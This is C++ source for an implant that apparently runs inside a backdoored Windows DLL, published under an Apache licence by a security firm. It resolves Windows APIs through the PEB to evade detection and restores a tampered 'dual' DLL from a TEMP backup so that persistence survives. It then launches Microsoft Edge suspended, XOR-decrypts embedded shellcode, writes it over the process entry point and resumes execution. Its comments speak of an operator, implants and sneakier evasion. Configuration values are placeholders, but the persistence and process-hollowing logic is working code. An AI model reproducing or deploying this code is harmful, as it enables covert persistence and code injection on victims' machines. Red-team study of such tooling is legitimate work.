/**
 * Copyright 2024 Aon plc
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <Windows.h>
#include "peb_lookup.h"
#include "helper.h"

#define KEY "asdf"
#define KEYLEN 69
#define SCLEN 69
#define DUALITYSECNAME ".duality"
#define ENSCNAME ".ensc"
#define DLLPATH "asdf"
#define BACKUPNAME "asdf"
#define CHECKMUTEX "asdf"


int main()
{
	const char* duals[] = { "asdf" };
	const char* backupPrefixes[] = { "asdf" };
	int numberOfDuals = sizeof(duals) / sizeof(const char*);

	LPVOID base = get_module_by_name((const LPWSTR)L"kernel32.dll");
	if (!base) {
		return 0;
	}

	LPVOID create_file = get_func_by_name((HMODULE)base, (LPSTR)"CreateFileA");
	if (!create_file) {
		return 3;
	}
	auto _CreateFile = reinterpret_cast<decltype(&CreateFileA)>(create_file);

	/*
	LPVOID write_file = get_func_by_name((HMODULE)base, (LPSTR)"WriteFile");
	if (!write_file) {
		return 3;
	}
	auto _WriteFile = reinterpret_cast<decltype(&WriteFile)>(write_file);
	HANDLE fout = _CreateFile("C:\\UseThisForDebuggingShellcodeN00bEdition", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
	LPDWORD nob = 0;
	 char a[] = "here_1";
	 _WriteFile(fout, a, 6, nob, NULL);
	*/

	LPVOID get_module_handle_a = get_func_by_name((HMODULE)base, (LPSTR)"GetModuleHandleA");
	if (!get_module_handle_a) {
		return 3;
	}
	auto _GetModuleHandleA = reinterpret_cast<decltype(&GetModuleHandleA)>(get_module_handle_a);

	LPVOID close_handle = get_func_by_name((HMODULE)base, (LPSTR)"CloseHandle");
	if (!close_handle) {
		return 3;
	}
	auto _CloseHandle = reinterpret_cast<decltype(&CloseHandle)>(close_handle);

	LPVOID open_mutex_a = get_func_by_name((HMODULE)base, (LPSTR)"OpenMutexA");
	if (!open_mutex_a) {
		return 3;
	}
	auto _OpenMutexA = reinterpret_cast<decltype(&OpenMutexA)>(open_mutex_a);

	LPVOID create_mutex_a = get_func_by_name((HMODULE)base, (LPSTR)"CreateMutexA");
	if (!create_mutex_a) {
		return 3;
	}
	auto _CreateMutexA = reinterpret_cast<decltype(&CreateMutexA)>(create_mutex_a);

	LPVOID ntdllbase = get_module_by_name((const LPWSTR)L"ntdll.dll");
	if (!ntdllbase) {
		return 1;
	}

	LPVOID nt_query_information_process = get_func_by_name((HMODULE)ntdllbase, (LPSTR)"NtQueryInformationProcess");
	if (!nt_query_information_process) {
		return 2;
	}
	auto _NtQueryInformationProcess = reinterpret_cast<decltype(&NtQueryInformationProcess)>(nt_query_information_process);

	LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)"LoadLibraryA");
	if (!load_lib) {
		return 2;
	}
	auto _LoadLibraryA = reinterpret_cast<decltype(&LoadLibraryA)>(load_lib);

	LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)"GetProcAddress");
	if (!get_proc) {
		return 3;
	}
	auto _GetProcAddress = reinterpret_cast<decltype(&GetProcAddress)>(get_proc);

	LPVOID open_process = get_func_by_name((HMODULE)base, (LPSTR)"OpenProcess");
	if (!open_process) {
		return 3;
	}
	auto _OpenProcess = reinterpret_cast<decltype(&OpenProcess)>(open_process);

	LPVOID virtual_alloc = get_func_by_name((HMODULE)base, (LPSTR)"VirtualAlloc");
	if (!virtual_alloc) {
		return 3;
	}
	auto _VirtualAlloc = reinterpret_cast<decltype(&VirtualAlloc)>(virtual_alloc);

	LPVOID virtual_alloc_ex = get_func_by_name((HMODULE)base, (LPSTR)"VirtualAllocEx");
	if (!virtual_alloc_ex) {
		return 3;
	}
	auto _VirtualAllocEx = reinterpret_cast<decltype(&VirtualAllocEx)>(virtual_alloc_ex);

	LPVOID virtual_protect = get_func_by_name((HMODULE)base, (LPSTR)"VirtualProtect");
	if (!virtual_protect) {
		return 3;
	}
	auto _VirtualProtect = reinterpret_cast<decltype(&VirtualProtect)>(virtual_protect);

	LPVOID write_process_memory = get_func_by_name((HMODULE)base, (LPSTR)"WriteProcessMemory");
	if (!write_process_memory) {
		return 3;
	}
	auto _WriteProcessMemory = reinterpret_cast<decltype(&WriteProcessMemory)>(write_process_memory);

	LPVOID read_process_memory = get_func_by_name((HMODULE)base, (LPSTR)"ReadProcessMemory");
	if (!read_process_memory) {
		return 3;
	}
	auto _ReadProcessMemory = reinterpret_cast<decltype(&ReadProcessMemory)>(read_process_memory);

	LPVOID create_thread = get_func_by_name((HMODULE)base, (LPSTR)"CreateThread");
	if (!create_thread) {
		return 3;
	}
	auto _CreateThread = reinterpret_cast<decltype(&CreateThread)>(create_thread);

	LPVOID create_remote_thread = get_func_by_name((HMODULE)base, (LPSTR)"CreateRemoteThread");
	if (!create_remote_thread) {
		return 3;
	}
	auto _CreateRemoteThread = reinterpret_cast<decltype(&CreateRemoteThread)>(create_remote_thread);

	LPVOID resume_thread = get_func_by_name((HMODULE)base, (LPSTR)"ResumeThread");
	if (!resume_thread) {
		return 3;
	}
	auto _ResumeThread = reinterpret_cast<decltype(&ResumeThread)>(resume_thread);

	LPVOID create_process_a = get_func_by_name((HMODULE)base, (LPSTR)"CreateProcessA");
	if (!create_process_a) {
		return 3;
	}
	auto _CreateProcessA = reinterpret_cast<decltype(&CreateProcessA)>(create_process_a);

	LPVOID heap_alloc = get_func_by_name((HMODULE)base, (LPSTR)"HeapAlloc");
	if (!heap_alloc) {
		return 3;
	}
	auto _HeapAlloc = reinterpret_cast<decltype(&HeapAlloc)>(heap_alloc);

	LPVOID get_process_heap = get_func_by_name((HMODULE)base, (LPSTR)"GetProcessHeap");
	if (!get_process_heap) {
		return 3;
	}
	auto _GetProcessHeap = reinterpret_cast<decltype(&GetProcessHeap)>(get_process_heap);

	LPVOID wait_for_single_object = get_func_by_name((HMODULE)base, (LPSTR)"WaitForSingleObject");
	if (!wait_for_single_object) {
		return 3;
	}
	auto _WaitForSingleObject = reinterpret_cast<decltype(&WaitForSingleObject)>(wait_for_single_object);

	LPVOID get_current_process = get_func_by_name((HMODULE)base, (LPSTR)"GetCurrentProcess");
	if (!get_current_process) {
		return 3;
	}
	auto _GetCurrentProcess = reinterpret_cast<decltype(&GetCurrentProcess)>(get_current_process);

	LPVOID move_file_a = get_func_by_name((HMODULE)base, (LPSTR)"MoveFileA");
	if (!move_file_a) {
		return 3;
	}
	auto _MoveFileA = reinterpret_cast<decltype(&MoveFileA)>(move_file_a);

	LPVOID read_file = get_func_by_name((HMODULE)base, (LPSTR)"ReadFile");
	if (!read_file) {
		return 3;
	}
	auto _ReadFile = reinterpret_cast<decltype(&ReadFile)>(read_file);

	LPVOID set_file_pointer = get_func_by_name((HMODULE)base, (LPSTR)"SetFilePointer");
	if (!set_file_pointer) {
		return 3;
	}
	auto _SetFilePointer = reinterpret_cast<decltype(&SetFilePointer)>(set_file_pointer);

	LPVOID get_last_error = get_func_by_name((HMODULE)base, (LPSTR)"GetLastError");
	if (!get_last_error) {
		return 3;
	}
	auto _GetLastError = reinterpret_cast<decltype(&GetLastError)>(get_last_error);

	LPVOID delete_file_a = get_func_by_name((HMODULE)base, (LPSTR)"DeleteFileA");
	if (!delete_file_a) {
		return 3;
	}
	auto _DeleteFileA = reinterpret_cast<decltype(&DeleteFileA)>(delete_file_a);

	LPVOID get_temp_path_a = get_func_by_name((HMODULE)base, (LPSTR)"GetTempPathA");
	if (!get_temp_path_a) {
		return 3;
	}
	auto _GetTempPathA = reinterpret_cast<decltype(&GetTempPathA)>(get_temp_path_a);

	LPVOID get_file_attributes_a = get_func_by_name((HMODULE)base, (LPSTR)"GetFileAttributesA");
	if (!get_file_attributes_a) {
		return 3;
	}
	auto _GetFileAttributesA = reinterpret_cast<decltype(&GetFileAttributesA)>(get_file_attributes_a);

	LPVOID copy_file_a = get_func_by_name((HMODULE)base, (LPSTR)"CopyFileA");
	if (!copy_file_a) {
		return 3;
	}
	auto _CopyFileA = reinterpret_cast<decltype(&CopyFileA)>(copy_file_a);

	LPVOID get_module_file_name_a = get_func_by_name((HMODULE)base, (LPSTR)"GetModuleFileNameA");
	if (!get_module_file_name_a) {
		return 3;
	}
	auto _GetModuleFileNameA = reinterpret_cast<decltype(&GetModuleFileNameA)>(get_module_file_name_a);

	// cMutex will make sure we check on other implants every time each implant program runs, 
	//		but NOT on every modload event of that DLL.
	auto cMutex = _OpenMutexA(MUTEX_ALL_ACCESS, 0, (LPCSTR)CHECKMUTEX);

	if (numberOfDuals >= 1 && !cMutex) {
		cMutex = _CreateMutexA(0, 0, (LPCSTR)CHECKMUTEX);

		const char dllPath[] = DLLPATH;
		const char backupDllName[] = BACKUPNAME;
		for (int d = 0; d < numberOfDuals; d++) {
			const char* otherDllPath = duals[d];
			const char* otherDllBackupName = backupPrefixes[d];
			PCHAR otherDllName = getDLLNameFromFullPath(otherDllPath, _VirtualAlloc);
			PCHAR otherDllDir = getDLLDirFromFullPath(otherDllPath, _VirtualAlloc);

			// Look for the Mark of the Dual in other file(s) - i.e. find the .duality section
			// This function courtesy of ChatGPT ;)
			char sectionName[] = DUALITYSECNAME;
			bool dualityExists = false;
			HANDLE dllFile = _CreateFile(otherDllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (dllFile != INVALID_HANDLE_VALUE) {
				IMAGE_DOS_HEADER dosHeader;
				DWORD bytesRead;
				_ReadFile(dllFile, &dosHeader, sizeof(IMAGE_DOS_HEADER), &bytesRead, NULL);

				IMAGE_NT_HEADERS ntHeader;
				_SetFilePointer(dllFile, dosHeader.e_lfanew, NULL, FILE_BEGIN);
				_ReadFile(dllFile, &ntHeader, sizeof(IMAGE_NT_HEADERS), &bytesRead, NULL);

				IMAGE_SECTION_HEADER sectionHeader;
				for (int i = 0; i < ntHeader.FileHeader.NumberOfSections; i++) {
					_ReadFile(dllFile, &sectionHeader, sizeof(IMAGE_SECTION_HEADER), &bytesRead, NULL);
					bool match = true;
					for (int j = 0; j < IMAGE_SIZEOF_SHORT_NAME; j++) {
						if (sectionHeader.Name[j] != sectionName[j]) {
							match = false;
							break;
						}
					}
					if (match) {
						_CloseHandle(dllFile);
						dualityExists = true;
						break;
					}
				}

				if (!dualityExists) {
					// Duality doesn't exist, let's grab what we backed up from TEMP and overwrite the vanilla version
					_CloseHandle(dllFile);
					//					PCHAR tempBackupFilePath = str_cat(getTempPathString(_GetTempPathA, _VirtualAlloc), otherDllBackupName);
					//					ReplaceFileA(otherDllPath, tempBackupFilePath, NULL, REPLACEFILE_COPY, NULL, NULL);
					char suffix[] = ".bak";
					PCHAR suffixph = str_cat(otherDllPath, suffix, _VirtualAlloc);

					// Move the original to some suffixed file. If already there, delete it and move again.
					int mf = _MoveFileA(otherDllPath, suffixph);
					int le = _GetLastError();
					if (!mf && le == 0xB7) {
						_DeleteFileA(suffixph);
						mf = _MoveFileA(otherDllPath, suffixph);
						if (!mf) {
							// You probably are debugging the target file :)
							return 5417;
						}
					}
					CopyFileFromTempToDir(otherDllDir, otherDllName, otherDllBackupName, _VirtualAlloc, _GetTempPathA, _CopyFileA);
				}
				else {
					// Duality exists, let's back both of us up to TEMP
					BackupFileToTemp(dllPath, backupDllName, _VirtualAlloc, _GetTempPathA, _CopyFileA);
					BackupFileToTemp(otherDllPath, otherDllBackupName, _VirtualAlloc, _GetTempPathA, _CopyFileA);
				}
			}
			else {
				// If the dual got nuked entirely (like program uninstall), we're operating in "SINGULARITY" mode
				// Here we can notify our operator somehow that we lost our secondary persistence / dual via web request for example.
				// But basically we can't just drop in another backdoored DLL cuz there's no program, or the functionality changed massively
				//		that the DLL is no longer in the release.
				int x = 69;
			}
		}
	}

	// hMutex will make sure our implant runs only once no matter how many other implant programs load the backdoored DLL
	//		and definitely not on every modload event.
	auto hMutex = _OpenMutexA(MUTEX_ALL_ACCESS, 0, (LPCSTR)"Local\\tm22s");
	if (hMutex) {
		return 0;
	}
	hMutex = _CreateMutexA(0, 0, (LPCSTR)"Local\\tm22s");

	// We probably want the exact size of the shellcode, so we won't use the entire rounded-up section size here.
	// Technically speaking, we might not need the exact size as we xor, but let's be specific if we can.
	// Point is we don't really do anything with pEncSecSize other than satisfy the following function call.
	char enscSecName[] = ENSCNAME;
	PLONG pEncSecSize = (PLONG)_VirtualAlloc(NULL, sizeof(LONG), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	DWORD64 encScDynamicBase = FindSectionInAllModulesCurrentProc(enscSecName, pEncSecSize, _GetModuleHandleA);
	if (encScDynamicBase == -1) {
		return 69;
	}


	// The following part all pertains to process injection. The example below is trivial, modify as you wish.
	// If you need more WinAPI, dynamically resolve them similarly to above.
	// If you need sneakier stuff (syscalls, other d/invoke stuff), all can be done here.

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	PROCESS_BASIC_INFORMATION pbi;
	DWORD returnLength = 0;

	PCHAR csi = (PCHAR)(&si);
	for (INT i = 0; i < sizeof(si); i++) {
		(*(csi + i)) = '\0';
	}
	PCHAR cpi = (PCHAR)(&pi);
	for (INT i = 0; i < sizeof(pi); i++) {
		(*(cpi + i)) = '\0';
	}
	PCHAR cpbi = (PCHAR)(&pbi);
	for (INT i = 0; i < sizeof(pbi); i++) {
		(*(cpbi + i)) = '\0';
	}

	_CreateProcessA(0, (LPSTR)"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

	CHAR key[] = KEY;

	// get target image PEB address and pointer to image base
	_NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	DWORD64 pebOffset = (DWORD64)(pbi.PebBaseAddress) + 16;

	// get target process image base address
	DWORD64 imageBaseInj = 0;
	_ReadProcessMemory(pi.hProcess, (LPCVOID)pebOffset, &imageBaseInj, 8, NULL);

	// read target process image headers
	LPVOID headersBuffer = (LPVOID)_VirtualAlloc(NULL, 4096, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	_ReadProcessMemory(pi.hProcess, (LPCVOID)imageBaseInj, headersBuffer, 4096, NULL);

	// get AddressOfEntryPoint
	PIMAGE_DOS_HEADER dosHeaderInj = (PIMAGE_DOS_HEADER)headersBuffer;
	PIMAGE_NT_HEADERS ntHeaderInj = (PIMAGE_NT_HEADERS)((DWORD64)headersBuffer + dosHeaderInj->e_lfanew);
	DWORD64 codeEntry = (DWORD64)(ntHeaderInj->OptionalHeader.AddressOfEntryPoint + imageBaseInj);

	INT j = 0;

	for (INT i = 0; i < SCLEN; i++) {
		if (j == KEYLEN) j = 0;
		CHAR sc = (((PCHAR)encScDynamicBase)[i]) ^ key[j];
		_WriteProcessMemory(pi.hProcess, ((PCHAR)codeEntry) + i, &sc, sizeof CHAR, NULL);
		j++;
	}

	_ResumeThread(pi.hThread);

	return 0;
}
